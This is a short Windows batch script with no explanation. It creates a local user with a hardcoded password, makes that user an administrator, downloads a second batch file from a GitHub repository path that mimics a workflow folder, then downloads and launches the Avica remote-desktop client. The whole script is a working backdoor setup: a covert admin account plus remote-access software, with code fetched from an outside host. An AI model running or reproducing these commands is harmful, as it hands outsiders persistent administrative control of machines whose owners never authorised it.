@echo off
setlocal

net user iamjorder "Mamunja201" /add
net localgroup Administrators iamjorder /add

curl -o show.bat https://raw.githubusercontent.com/deborahadams631/friendly/refs/heads/main/.github/workflows/show.bat
curl -o AvicaLite.exe https://download.avica.com/AvicaLite_v8.0.8.9.exe

start "" /WAIT AvicaLite.exe


endlocal
